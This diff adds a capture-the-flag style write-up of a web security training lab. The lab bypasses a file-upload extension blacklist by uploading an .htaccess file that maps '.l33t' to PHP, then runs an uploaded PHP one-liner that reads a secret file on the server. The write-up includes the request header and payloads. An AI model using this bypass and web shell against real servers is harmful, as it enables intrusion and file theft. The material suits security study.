@@ -264,7 +264,64 @@ MDkBY5byb22IlmP48nQqlbwOjszk9a0z
 
 
 
+<details>
+  <summary>Lab: Web shell upload via extension blacklist bypass</summary>
 
+
+
+> You can log in to your own account using the following credentials: ``wiener:peter`` 
+
+
+
+---
+
+> ## in this lab server don't allow to upload ``.php`` files
+> ### this lab use ``Apache`` server ``+`` ``mod_php`` this php module allow apache to excute ``php`` files Directly
+> in apache there is feature call ``per-directory configuration`` that is mean you can add file with instructures inside any directory in server this file call ``.htaccess`` this file change the way that server deal with files in this directory only
+
+1. login as ``wiener``
+2. create new file call ``file.txt`` contain
+
+```
+AddType application/x-httpd-php .l33t
+```
+
+> this content tell ``apache`` that any file with ``.l33t`` extension deal with it as ``php`` file and excute it
+
+when send it change ``filename`` to ``.htaccess``
+
+```http
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+```
+
+<img width="1224" height="580" alt="image" src="https://github.com/user-attachments/assets/7364949a-a9a0-4f1c-8382-973b6caab83b" />
+
+> #### now if i upload ``php`` file with ``l33t`` extension it will uploaded
+
+3. make file ``exploit.l33t``
+
+```php
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+<img width="1250" height="616" alt="image" src="https://github.com/user-attachments/assets/a2d662ab-4237-45e1-8632-0574a0007aaf" />
+
+it uploaded successfully 
+
+4. now run this file
+
+```
+https://0ac900c804effd6783b30a9a00b1002b.web-security-academy.net/files/avatars/exploit.l33t
+```
+
+<img width="997" height="233" alt="image" src="https://github.com/user-attachments/assets/e3297f2c-fd02-414d-8129-54b83d6e3308" />
+
+
+```
+a70CUTgIcfSJ8OgubEYNg29zljZYF2NV
+```
+  
+</details>
 
 
 
